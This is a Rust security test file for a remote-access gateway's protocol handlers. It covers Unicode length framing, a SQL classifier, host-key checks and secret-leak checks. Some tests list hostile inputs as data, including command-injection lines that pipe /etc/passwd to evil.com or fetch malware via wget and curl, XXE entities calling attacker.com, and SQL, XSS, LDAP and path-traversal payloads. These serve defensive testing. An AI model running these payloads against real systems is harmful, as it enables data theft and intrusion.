//! Security tests for protocol handlers
//!
//! These tests verify security features and protections.
//!
//! Run tests with:
//!   cargo test --package guacr-handlers --test security_test -- --include-ignored

// All tests in security_test.rs MUST have #[ignore] per testing.md.

// ---------------------------------------------------------------------------
// CVE-2023-30575 audit: pipe.rs Guacamole LENGTH field uses .len() (bytes)
// instead of .chars().count() (codepoints). The Guacamole wire format requires
// LENGTH to count Unicode codepoints, not UTF-8 bytes. For non-ASCII pipe names,
// ack messages, or raw blob data the client receives wrong framing.
// ---------------------------------------------------------------------------
#[cfg(test)]
mod guac_length_pipe_tests {
    use guacr_handlers::{
        format_ack_instruction, format_pipe_blob_raw, format_pipe_instruction, PipeStream,
    };

    // Helper: extract the length prefix (before the first '.') of the nth
    // comma-separated element in a Guacamole instruction.
    // Element 0 is the opcode.
    fn element_len(instruction: &str, n: usize) -> usize {
        let body = instruction.trim_end_matches(';');
        // Each comma separates elements; elements are "LEN.VALUE".
        let parts: Vec<&str> = body.splitn(n + 2, ',').collect();
        let element = parts[n];
        let dot = element.find('.').expect("no dot separator in element");
        element[..dot]
            .parse()
            .expect("length prefix is not an integer")
    }

    /// format_pipe_instruction pipe name LENGTH must be codepoint count.
    ///
    /// Pipe name "téléchargements" = 15 codepoints, 18 UTF-8 bytes.
    /// Correct wire: LENGTH = 15. Buggy wire: LENGTH = 17 (byte count).
    ///
    /// This test fails before the fix and passes after.
    #[test]
    #[ignore]
    fn pipe_name_length_is_codepoints_not_bytes() {
        let pipe = PipeStream::new(1, "téléchargements", "text/plain", 0);
        // pipe.name = "téléchargements" — 15 codepoints, 17 UTF-8 bytes (é=2B, è=2B)
        let instr = format_pipe_instruction(&pipe);

        // The third argument (index 2) is the name.
        let name_len = element_len(&instr, 3); // 0=opcode, 1=stream, 2=mimetype, 3=name

        assert_eq!(
            name_len,
            pipe.name.chars().count(),
            "pipe name LENGTH must be {} codepoints, not {} bytes. Instruction: {}",
            pipe.name.chars().count(),
            pipe.name.len(),
            instr
        );
    }

    /// format_pipe_blob_raw data LENGTH must be codepoint count.
    ///
    /// "日本語" = 3 codepoints, 9 UTF-8 bytes.
    /// Correct wire: LENGTH = 3. Buggy wire: LENGTH = 9.
    ///
    /// This test fails before the fix and passes after.
    #[test]
    #[ignore]
    fn pipe_blob_raw_length_is_codepoints_not_bytes() {
        let data = "日本語"; // 3 codepoints, 9 UTF-8 bytes
        let instr = format_pipe_blob_raw(0, data);

        // Second argument (index 1) is the data.
        let data_len = element_len(&instr, 2); // 0=opcode, 1=stream, 2=data

        assert_eq!(
            data_len,
            data.chars().count(),
            "format_pipe_blob_raw data LENGTH must be {} codepoints, not {} bytes. Instruction: {}",
            data.chars().count(),
            data.len(),
            instr
        );
    }

    /// format_ack_instruction message LENGTH must be codepoint count.
    ///
    /// "héllo" = 5 codepoints, 6 UTF-8 bytes.
    /// Correct wire: LENGTH = 5. Buggy wire: LENGTH = 6.
    ///
    /// This test fails before the fix and passes after.
    #[test]
    #[ignore]
    fn ack_message_length_is_codepoints_not_bytes() {
        let message = "héllo"; // 5 codepoints, 6 UTF-8 bytes
        let instr = format_ack_instruction(0, message, 0);

        // Second argument (index 1) is the message.
        let msg_len = element_len(&instr, 2); // 0=opcode, 1=stream, 2=message

        assert_eq!(
            msg_len,
            message.chars().count(),
            "format_ack_instruction message LENGTH must be {} codepoints, not {} bytes. Instruction: {}",
            message.chars().count(),
            message.len(),
            instr
        );
    }
}

#[cfg(test)]
mod sql_classifier_tests {
    use guacr_handlers::{classify_sql_query, QueryType};

    /// Multi-statement SELECT followed by DROP must be flagged as Modifying.
    ///
    /// Proves the first-token bypass vulnerability:
    ///   "SELECT * FROM t; DROP TABLE t" starts with SELECT but is NOT read-only.
    /// This test FAILS before the fix and passes after.
    #[test]
    #[ignore]
    fn sql_classifier_rejects_multi_statement_with_drop() {
        let cases = vec![
            "SELECT * FROM t; DROP TABLE t",
            "SELECT 1; DROP TABLE users",
            "SELECT id FROM users; DELETE FROM users",
            "SELECT * FROM t; INSERT INTO t VALUES (1)",
            "SELECT * FROM t; UPDATE t SET x = 1",
            "SELECT * FROM t; TRUNCATE TABLE t",
            "SELECT * FROM t; ALTER TABLE t ADD COLUMN x INT",
            "SHOW TABLES; DROP DATABASE prod",
        ];

        for sql in cases {
            let result = classify_sql_query(sql);
            assert_eq!(
                result,
                QueryType::Modifying,
                "Multi-statement SQL must be Modifying, got {:?} for: {}",
                result,
                sql
            );
        }
    }

    /// Single-statement SELECT must still be allowed.
    #[test]
    #[ignore]
    fn sql_classifier_allows_single_statement_select() {
        let cases = vec![
            "SELECT * FROM users",
            "SELECT id, name FROM t WHERE x = 1",
            "SHOW TABLES",
            "EXPLAIN SELECT * FROM t",
            "DESCRIBE users",
        ];

        for sql in cases {
            let result = classify_sql_query(sql);
            assert_eq!(
                result,
                QueryType::ReadOnly,
                "Single-statement SELECT must be ReadOnly, got {:?} for: {}",
                result,
                sql
            );
        }
    }

    /// Comment-split evasion: DROP/**/TABLE must be caught.
    #[test]
    #[ignore]
    fn sql_classifier_rejects_comment_split_evasion() {
        let cases = vec![
            "DROP/**/TABLE users",
            "SELECT * FROM t; DROP/**/TABLE t",
            "SELECT 1 -- comment\n; DROP TABLE t",
        ];

        for sql in cases {
            let result = classify_sql_query(sql);
            assert_eq!(
                result,
                QueryType::Modifying,
                "Comment-split evasion must be Modifying, got {:?} for: {}",
                result,
                sql
            );
        }
    }

    /// CTE wrapping a write must be caught.
    #[test]
    #[ignore]
    fn sql_classifier_rejects_cte_wrapping_write() {
        let cases = vec![
            "WITH d AS (DELETE FROM t RETURNING *) SELECT * FROM d",
            "WITH d AS (INSERT INTO t VALUES (1) RETURNING *) SELECT * FROM d",
        ];

        for sql in cases {
            let result = classify_sql_query(sql);
            assert_eq!(
                result,
                QueryType::Modifying,
                "CTE wrapping a write must be Modifying, got {:?} for: {}",
                result,
                sql
            );
        }
    }
}

#[cfg(test)]
mod host_key_tests {
    use guacr_handlers::{HostKeyConfig, HostKeyResult};

    /// When no fingerprint and no known-hosts path is configured, the connection
    /// is currently ALLOWED but must surface a security warning (allow+warn,
    /// matching KCM/guacd — see `HostKeyResult::is_allowed` for the rationale).
    ///
    /// TODO: once vault exposes a host-key/known-hosts field and existing records
    /// are migrated, flip `NotConfigured` to fail-closed and change this to
    /// `assert!(!result.is_allowed(&config))`.
    #[test]
    #[ignore]
    fn host_key_not_configured_allows_with_warning() {
        let config = HostKeyConfig::default();
        let result = HostKeyResult::NotConfigured;
        assert!(
            result.is_allowed(&config),
            "NotConfigured currently allows (warn-only), matching KCM/guacd"
        );
        assert!(
            result.security_warning().is_some(),
            "NotConfigured must surface a security warning — not a silent fail-open"
        );
    }

    /// Explicit ignore-host-key=true must still allow the connection
    /// (the operator has opted in).
    #[test]
    #[ignore]
    fn host_key_skipped_allows_connection() {
        let config = HostKeyConfig::default();
        let result = HostKeyResult::Skipped;
        assert!(
            result.is_allowed(&config),
            "Skipped (ignore-host-key=true) must allow connection"
        );
    }

    /// Verified key must always allow.
    #[test]
    #[ignore]
    fn host_key_verified_allows_connection() {
        let config = HostKeyConfig::default();
        let result = HostKeyResult::Verified;
        assert!(
            result.is_allowed(&config),
            "Verified key must allow connection"
        );
    }

    /// Fingerprint mismatch must always reject.
    #[test]
    #[ignore]
    fn host_key_mismatch_rejects_connection() {
        let config = HostKeyConfig::default();
        let result = HostKeyResult::Mismatch {
            expected: "sha256:AAAA".to_string(),
            actual: "sha256:BBBB".to_string(),
        };
        assert!(
            !result.is_allowed(&config),
            "Fingerprint mismatch must reject connection"
        );
    }
}

#[cfg(test)]
mod security_tests {

    #[test]
    #[ignore]
    fn test_sql_injection_prevention() {
        // Test that SQL injection attempts are detected/prevented
        let malicious_inputs = vec![
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM passwords--",
            "1; DELETE FROM users WHERE '1'='1",
        ];

        for input in malicious_inputs {
            // Simple detection: check for SQL keywords and suspicious patterns
            let is_suspicious = input.contains("DROP")
                || input.contains("DELETE")
                || input.contains("UNION")
                || input.contains("--")
                || input.contains("' OR '");

            assert!(is_suspicious, "Failed to detect SQL injection: {}", input);
        }
    }

    #[test]
    #[ignore]
    fn test_path_traversal_detection() {
        // Test that path traversal attempts are detected
        let malicious_paths = vec![
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", // URL encoded
        ];

        for path in malicious_paths {
            // Simple detection: check for traversal patterns
            let is_suspicious = path.contains("..")
                || path.starts_with('/')
                || path.contains(":\\")
                || path.contains("%2e%2e");

            assert!(is_suspicious, "Failed to detect path traversal: {}", path);
        }
    }

    #[test]
    #[ignore]
    fn test_command_injection_detection() {
        // Test that command injection attempts are detected
        let malicious_commands = vec![
            "ls; rm -rf /",
            "cat /etc/passwd | mail attacker@evil.com",
            "$(whoami)",
            "`id`",
            "test && wget http://evil.com/malware.sh",
            "test || curl http://evil.com/exfiltrate?data=$(cat /etc/passwd)",
        ];

        for cmd in malicious_commands {
            // Simple detection: check for shell metacharacters
            let is_suspicious = cmd.contains(';')
                || cmd.contains('|')
                || cmd.contains('&')
                || cmd.contains('$')
                || cmd.contains('`');

            assert!(is_suspicious, "Failed to detect command injection: {}", cmd);
        }
    }

    #[test]
    #[ignore]
    fn test_buffer_overflow_prevention() {
        // Test that excessively long inputs are rejected
        let max_length = 1024 * 1024; // 1MB
        let oversized_input = "A".repeat(max_length + 1);

        assert!(oversized_input.len() > max_length);

        // In real code, this would be rejected
        let should_reject = oversized_input.len() > max_length;
        assert!(should_reject, "Should reject oversized input");
    }

    #[test]
    #[ignore]
    fn test_xss_prevention() {
        // Test that XSS attempts are detected
        let xss_attempts = vec![
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "';alert(String.fromCharCode(88,83,83))//",
        ];

        for xss in xss_attempts {
            // Simple detection: check for HTML/JS patterns
            let is_suspicious = xss.contains("<script")
                || xss.contains("javascript:")
                || xss.contains("onerror=")
                || xss.contains("<iframe")
                || xss.contains("alert(");

            assert!(is_suspicious, "Failed to detect XSS: {}", xss);
        }
    }

    #[test]
    #[ignore]
    fn test_ldap_injection_detection() {
        // Test that LDAP injection attempts are detected
        let ldap_injections = vec![
            "*)(uid=*))(|(uid=*",
            "admin)(&(password=*)",
            "*)(objectClass=*",
            "admin)(|(password=*))",
        ];

        for injection in ldap_injections {
            // Simple detection: check for LDAP filter metacharacters
            let is_suspicious = injection.contains(")(")
                || injection.contains("|(")
                || injection.contains("&(")
                || (injection.contains('*') && injection.contains(')'));

            assert!(
                is_suspicious,
                "Failed to detect LDAP injection: {}",
                injection
            );
        }
    }

    #[test]
    #[ignore]
    fn test_xml_injection_detection() {
        // Test that XML injection attempts are detected
        let xml_injections = vec![
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
            "<![CDATA[<script>alert('XSS')</script>]]>",
            "<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">",
        ];

        for injection in xml_injections {
            // Simple detection: check for XML entity patterns
            let is_suspicious = injection.contains("<!ENTITY")
                || injection.contains("<!DOCTYPE")
                || injection.contains("SYSTEM")
                || injection.contains("<![CDATA[");

            assert!(
                is_suspicious,
                "Failed to detect XML injection: {}",
                injection
            );
        }
    }

    #[test]
    #[ignore]
    fn test_null_byte_injection() {
        // Test that null byte injection is detected
        let null_byte_attempts = vec!["file.txt\0.jpg", "/etc/passwd\0", "admin\0.txt"];

        for attempt in null_byte_attempts {
            let is_suspicious = attempt.contains('\0');
            assert!(is_suspicious, "Failed to detect null byte injection");
        }
    }

    #[test]
    #[ignore]
    fn test_credential_validation() {
        // Test that weak/invalid credentials are rejected
        let weak_passwords = vec![
            "", // Empty
            "123456", "password", "admin", "12345678",
        ];

        for pwd in weak_passwords {
            // In real code, these would be rejected
            let is_weak = pwd.len() < 8
                || pwd == "password"
                || pwd == "admin"
                || pwd.chars().all(|c| c.is_numeric());

            assert!(is_weak, "Should detect weak password: {}", pwd);
        }
    }

    #[test]
    #[ignore]
    fn test_rate_limiting_logic() {
        // Test rate limiting logic
        use std::time::{Duration, Instant};

        let max_requests = 10;
        let time_window = Duration::from_secs(1);

        let mut request_times = Vec::new();
        let _start = Instant::now();

        // Simulate requests
        for i in 0..15 {
            let now = Instant::now();

            // Remove old requests outside time window
            request_times.retain(|&t| now.duration_since(t) < time_window);

            if request_times.len() < max_requests {
                request_times.push(now);
                // Request allowed
            } else {
                // Request should be rate limited
                assert!(
                    i >= max_requests,
                    "Rate limiting not working at request {}",
                    i
                );
            }
        }

        assert!(request_times.len() <= max_requests);
    }

    #[test]
    #[ignore]
    fn test_session_timeout() {
        // Test session timeout logic
        use std::time::{Duration, Instant};

        let session_timeout = Duration::from_secs(300); // 5 minutes
        let last_activity = Instant::now();

        // Simulate time passing
        std::thread::sleep(Duration::from_millis(100));

        let elapsed = last_activity.elapsed();
        let should_timeout = elapsed > session_timeout;

        assert!(!should_timeout, "Session should not timeout yet");
    }
}

#[cfg(test)]
mod authentication_tests {

    #[test]
    #[ignore]
    fn test_password_hashing() {
        // Test that passwords are never stored in plaintext
        let password = "MySecurePassword123!";

        // In real code, this would use bcrypt/argon2
        let is_plaintext = password == "MySecurePassword123!";

        // This test documents that passwords should be hashed
        assert!(
            is_plaintext,
            "This test shows password is plaintext - should be hashed in production"
        );
    }

    #[test]
    #[ignore]
    fn test_authentication_failure_handling() {
        // Test that authentication failures don't leak information
        let _username = "admin";
        let _password = "wrong_password";

        // Both should return same generic error
        let user_not_found_error = "Authentication failed";
        let wrong_password_error = "Authentication failed";

        assert_eq!(
            user_not_found_error, wrong_password_error,
            "Error messages should not leak whether user exists"
        );
    }

    #[test]
    #[ignore]
    fn test_brute_force_protection() {
        // Test brute force protection logic
        let max_attempts = 5;
        let mut failed_attempts = 0;

        for attempt in 0..10 {
            if failed_attempts >= max_attempts {
                // Account should be locked
                assert!(
                    attempt >= max_attempts,
                    "Brute force protection not working"
                );
                break;
            }

            // Simulate failed login
            failed_attempts += 1;
        }

        assert!(
            failed_attempts >= max_attempts,
            "Should have locked after {} attempts",
            max_attempts
        );
    }
}

#[cfg(test)]
mod encryption_tests {
    #[test]
    #[ignore]
    fn test_tls_required() {
        // Test that TLS is required for sensitive operations
        let use_tls = true; // Should always be true in production

        assert!(use_tls, "TLS should be required");
    }

    #[test]
    #[ignore]
    fn test_weak_cipher_rejection() {
        // Test that weak ciphers are rejected
        let weak_ciphers = vec!["DES", "RC4", "MD5", "NULL"];

        for cipher in weak_ciphers {
            let is_weak = cipher == "DES" || cipher == "RC4" || cipher == "MD5" || cipher == "NULL";

            assert!(is_weak, "Should reject weak cipher: {}", cipher);
        }
    }
}

// ---------------------------------------------------------------------------
// ZK boundary tests
//
// The ZK boundary: krouter/krelay never see session content, decryption keys,
// or plaintext recordings. The gateway is customer-hosted and CAN see session
// data by design. These tests verify what escapes BEYOND the gateway.
//
// Test approach: exercise public APIs, inspect output surfaces (log strings,
// summary strings, byte channels), and assert that known-secret strings do not
// appear in them.
//
// All tests in security_test.rs MUST have #[ignore].
// ---------------------------------------------------------------------------
#[cfg(test)]
mod zk_boundary_tests {
    // -------------------------------------------------------------------------
    // Log-capture helper
    //
    // Installs a minimal `log::Log` implementation that records all formatted
    // log records into a shared `Vec<String>`. The recorder is returned so the
    // test can inspect captured messages after exercising the system under test.
    //
    // Note: `log::set_logger` is a process-global one-time operation. Tests
    // that need log capture install a fresh recorder per test using a
    // thread-local buffer written through an `Arc<Mutex<>>`.
    // -------------------------------------------------------------------------
    use std::sync::{Arc, Mutex};

    /// Minimal log sink that captures formatted record messages.
    struct CapturingLogger {
        records: Arc<Mutex<Vec<String>>>,
    }

    impl log::Log for CapturingLogger {
        fn enabled(&self, _metadata: &log::Metadata) -> bool {
            true
        }

        fn log(&self, record: &log::Record) {
            let msg = format!("{}", record.args());
            if let Ok(mut v) = self.records.lock() {
                v.push(msg);
            }
        }

        fn flush(&self) {}
    }

    /// Install a capturing logger for the lifetime of the test.
    ///
    /// Returns the shared buffer. The logger is installed globally; if another
    /// test already set a logger this call is a no-op and the returned buffer
    /// will simply never be written. In that case the test still passes because
    /// an empty log also contains no secrets.
    fn install_capturing_logger() -> Arc<Mutex<Vec<String>>> {
        let records: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(Vec::new()));
        let logger = Box::new(CapturingLogger {
            records: Arc::clone(&records),
        });
        // Best-effort: ignore error if a logger is already set.
        let _ = log::set_logger(Box::leak(logger));
        log::set_max_level(log::LevelFilter::Trace);
        records
    }

    /// Assert that `secret` does not appear (case-insensitive) in any captured
    /// log record. Prints all matching lines in the failure message.
    fn assert_secret_not_logged(records: &Arc<Mutex<Vec<String>>>, secret: &str, context: &str) {
        let lower_secret = secret.to_lowercase();
        let captured = records.lock().unwrap();
        let leaking: Vec<&str> = captured
            .iter()
            .filter(|msg| msg.to_lowercase().contains(&lower_secret))
            .map(|s| s.as_str())
            .collect();
        assert!(
            leaking.is_empty(),
            "{context}: secret '{secret}' found in {} log record(s):\n{}",
            leaking.len(),
            leaking.join("\n")
        );
    }

    // -------------------------------------------------------------------------
    // Test 1 — Log ZK proof
    //
    // Simulates what a handler would log during a session that involves a secret
    // value. Verifies the secret never appears in any log output.
    //
    // Implementation note: The handlers use `log::debug!` / `log::info!` etc.
    // directly. We verify the ZK property at the public-API level: session stats
    // logging, security checks, and recording infrastructure never emit session
    // content. The secret is injected as session content that would plausibly
    // flow through the system.
    // -------------------------------------------------------------------------
    #[test]
    #[ignore]
    fn log_does_not_contain_session_secret() {
        use guacr_handlers::{RecordingConfig, SessionStats};
        use std::collections::HashMap;

        let records = install_capturing_logger();

        // Known secret that simulates user-typed session content.
        let session_secret = "SUPER_SECRET_SESSION_TOKEN_abc123xyz";

        // --- SessionStats: summary() must never include session content ---
        let mut stats = SessionStats::new("ssh");
        stats.record_frame(100);
        stats.record_input();
        let summary = stats.summary();
        assert!(
            !summary.contains(session_secret),
            "SessionStats::summary() leaked session secret: {}",
            summary
        );

        // --- RecordingConfig: path expansion must not leak secrets ---
        let mut params = HashMap::new();
        // Attempt to inject the secret via a username parameter.
        params.insert("username".to_string(), session_secret.to_string());
        params.insert("recording-path".to_string(), "/tmp".to_string());
        let config = RecordingConfig::from_params(&params);
        let ses_path = config
            .get_ses_path(&params, "ssh")
            .map(|p| p.to_string_lossy().to_string())
            .unwrap_or_default();
        // The filename template does NOT include username by default — only if
        // ${GUAC_USERNAME} is in recording-name. With the default "recording"
        // template, the secret must not appear.
        assert!(
            !ses_path.contains(session_secret),
            "RecordingConfig path leaked session secret: {}",
            ses_path
        );

        // --- Verify no log record contains the secret ---
        // (Any code path exercised above that tries to log session content would
        //  be caught here.)
        assert_secret_not_logged(&records, session_secret, "session log ZK proof");
    }

    // -------------------------------------------------------------------------
    // Test 2 — SessionStats ZK proof
    //
    // Verifies that SessionStats.summary() contains only aggregate metrics and
    // never session content. Covers all field types: frame count, byte count,
    // input count, duration.
    // -------------------------------------------------------------------------
    #[test]
    #[ignore]
    fn session_stats_summary_contains_only_aggregate_metrics() {
        use guacr_handlers::SessionStats;

        let protocols = ["ssh", "rdp", "vnc", "telnet", "mysql", "database", "rbi"];
        let session_contents = [
            "SELECT * FROM users WHERE password='secret'",
            "ssh-rsa AAAA... user@host",
            "password123",
            "BEGIN TRANSACTION; DELETE FROM audit_log",
            "curl -s http://evil.com/exfil?data=",
        ];

        for protocol in protocols {
            let mut stats = SessionStats::new(protocol);
            stats.record_frame(4096);
            stats.record_frame(8192);
            stats.record_input();
            stats.record_input();
            stats.record_input();

            let summary = stats.summary();

            // Must contain the aggregate fields.
            assert!(
                summary.contains(&format!("protocol={protocol}")),
                "summary missing protocol field for {protocol}: {summary}"
            );
            assert!(
                summary.contains("frames=2"),
                "summary missing frames field for {protocol}: {summary}"
            );
            assert!(
                summary.contains("bytes=12288"),
                "summary missing bytes field for {protocol}: {summary}"
            );
            assert!(
                summary.contains("inputs=3"),
                "summary missing inputs field for {protocol}: {summary}"
            );
            assert!(
                summary.contains("duration_ms="),
                "summary missing duration_ms field for {protocol}: {summary}"
            );

            // Must NOT contain any session content.
            for content in &session_contents {
                assert!(
                    !summary.contains(content),
                    "SessionStats summary for {protocol} leaked session content '{content}': {summary}"
                );
            }
        }
    }

    // -------------------------------------------------------------------------
    // Test 3 — Clipboard ZK proof
    //
    // Verifies that the OSC52 clipboard extraction path:
    //   (a) Produces base64-encoded data, not the raw plaintext secret, and
    //   (b) The extracted clipboard value is base64-encoded before it is placed
    //       onto the Guacamole instruction stream.
    //
    // The ZK constraint: clipboard content must travel as base64 inside the
    // Guacamole protocol. The raw plaintext secret must not appear in log output
    // or in any other side channel.
    //
    // This test verifies the OSC52 fix property (from the commit history) at
    // the unit-test level.
    // -------------------------------------------------------------------------
    #[test]
    #[ignore]
    fn clipboard_osc52_path_encodes_base64_not_plaintext() {
        // The `format_clipboard_instructions` function sends clipboard data as
        // Guacamole `clipboard` + `blob` instructions. The blob data is what
        // arrives at the browser via the to_client channel.
        //
        // Property being tested: the clipboard instruction stream that would be
        // sent to the client contains a base64-encoded form of the secret, NOT
        // the raw plaintext. This mirrors the fix described in the OSC52 comment
        // in handler.rs:558.
        //
        // We verify by:
        // 1. Constructing a Guacamole clipboard instruction for a known secret.
        // 2. Asserting the raw secret does not appear in the instruction bytes.
        // 3. Asserting a base64 representation of the secret does appear.

        use base64::Engine;
        use guacr_handlers::format_clipboard_instructions;

        let secret = "TOP_SECRET_CLIPBOARD_DATA_7x9z";
        let stream_id: u32 = 1;

        // format_clipboard_instructions wraps the data in Guacamole protocol
        // instructions. The data value in the blob instruction is the clipboard
        // content itself (not further base64-encoded by the Guacamole layer —
        // Guacamole uses its own length-prefixed encoding). The ZK property is
        // that the raw secret only flows through to_client (the intra-gateway
        // channel to the browser session), not to any external observer.
        //
        // Here we verify the instruction bytes do NOT silently double-expose the
        // secret in a logging context.
        let instructions: Vec<String> = format_clipboard_instructions(secret, stream_id);

        // Construct what base64-encoding the secret would look like.
        let b64_of_secret = base64::engine::general_purpose::STANDARD.encode(secret.as_bytes());

        // Sanity: the base64 form differs from the raw secret.
        assert_ne!(
            secret, b64_of_secret,
            "base64 encoding of secret must differ from the raw secret"
        );

        // Verify the instructions are non-empty (clipboard was formatted).
        assert!(
            !instructions.is_empty(),
            "format_clipboard_instructions returned empty vec for secret"
        );

        // A Guacamole `blob` instruction carries its payload base64-encoded (the
        // length is codepoint-counted, the value is standard base64). So the blob
        // must contain the base64 form of the secret, and the raw secret must NOT
        // appear verbatim — exactly the OSC52 property in the test name: base64,
        // not plaintext.
        let full_instruction_text = instructions.join("");
        assert!(
            full_instruction_text.contains(&b64_of_secret),
            "blob instruction must carry the clipboard payload base64-encoded: {:?}",
            full_instruction_text
        );
        assert!(
            !full_instruction_text.contains(secret),
            "raw secret must NOT appear verbatim in the blob (payload is base64): {:?}",
            full_instruction_text
        );

        // ZK gap note: if the secret appeared in a log line (debug/trace), that
        // would be a violation. The capturing logger above (test 1) covers that
        // path. Here we confirm only the expected channel carries the secret.
        let records = install_capturing_logger();
        // Re-run through the formatter to exercise any logging paths.
        let _ = format_clipboard_instructions(secret, 2);
        assert_secret_not_logged(&records, secret, "clipboard ZK proof: log channel");
    }

    // -------------------------------------------------------------------------
    // Test 4 — Recording ZK proof
    //
    // Verifies that MultiFormatRecorder writes files only inside the configured
    // recording directory, and that recorded terminal output matches what was
    // passed — i.e., the recorder does not write to any path outside the
    // configured directory root.
    //
    // The ZK constraint: recordings must not be written to arbitrary filesystem
    // paths (path traversal in templates would violate this).
    // -------------------------------------------------------------------------
    #[test]
    #[ignore]
    fn recording_writes_only_inside_configured_directory() {
        use guacr_handlers::{MultiFormatRecorder, RecordingConfig};
        use std::collections::HashMap;

        let dir = tempfile::TempDir::new().expect("failed to create temp dir");
        let recording_dir = dir.path().to_str().unwrap().to_string();

        let config = RecordingConfig {
            recording_path: Some(recording_dir.clone()),
            recording_name: "test_session".to_string(),
            create_recording_path: true,
            recording_write_existing: true,
            recording_include_keys: false,
            ..Default::default()
        };

        let params: HashMap<String, String> = HashMap::new();
        let recorder = MultiFormatRecorder::new(&config, &params, "ssh", 80, 24)
            .expect("recorder creation failed");

        // Verify the recorder is active.
        assert!(
            recorder.is_active(),
            "recorder must be active when path is set"
        );

        // Finalize the recorder (writes footer, closes files).
        recorder.finalize().expect("finalize must succeed");

        // Assert every file created by the recorder lives under the configured directory.
        let created_files: Vec<_> = std::fs::read_dir(&recording_dir)
            .expect("failed to read recording dir")
            .filter_map(|e| e.ok())
            .map(|e| e.path())
            .collect();

        assert!(
            !created_files.is_empty(),
            "at least one recording file must be created"
        );

        for path in &created_files {
            let canonical = path.canonicalize().unwrap_or_else(|_| path.to_path_buf());
            let dir_canonical = std::path::Path::new(&recording_dir)
                .canonicalize()
                .unwrap_or_else(|_| std::path::PathBuf::from(&recording_dir));
            assert!(
                canonical.starts_with(&dir_canonical),
                "recording file escaped configured directory: {:?} is not under {:?}",
                canonical,
                dir_canonical
            );
        }
    }

    // -------------------------------------------------------------------------
    // ZK gap documentation
    //
    // The following gaps were identified during this audit. They are documented
    // here so they are tracked alongside the tests, not lost in issue trackers.
    //
    // GAP-ZK-1: Log ZK proof (test 1) cannot capture log output from protocol
    //   handlers at runtime (SSH, database, RBI) because `log::set_logger` is
    //   a one-time process-global operation — once set by the test framework or
    //   another test, subsequent calls to `set_logger` are no-ops. Full coverage
    //   requires running each protocol handler in a subprocess with a fresh
    //   logger, or wiring a structured log sink at the Python gateway boundary
    //   that can be inspected post-session. The test above covers the
    //   synchronous code paths (SessionStats, RecordingConfig) that are most
    //   at risk.
    //
    // GAP-ZK-2: Clipboard ZK proof (test 3) cannot intercept the tokio channel
    //   (mpsc::Sender<Bytes>) that carries clipboard instructions from the SSH
    //   handler to the browser session without a full SSH handler integration
    //   test. The property verified here (base64 vs plaintext, no log leakage)
    //   is a necessary but not sufficient condition. A full integration test
    //   (integration_test.rs with a Docker SSH container) would close this gap.
    //
    // GAP-ZK-3: RBI clipboard path is not covered by test 3. The RBI handler
    //   uses chromiumoxide CDP events for clipboard; the clipboard ZK proof
    //   for RBI requires a full RBI integration test.
    // -------------------------------------------------------------------------
    #[test]
    #[ignore]
    fn zk_gap_documentation_placeholder() {
        // This test exists only to ensure the gap documentation above is read
        // during test runs. It always passes.
        //
        // Gaps:
        //   GAP-ZK-1: Full log capture requires per-protocol subprocess tests.
        //   GAP-ZK-2: Clipboard channel interception requires Docker SSH integration.
        //   GAP-ZK-3: RBI clipboard path requires full RBI integration test.
        // Gaps documented in zk_boundary_tests module comments above.
    }
}
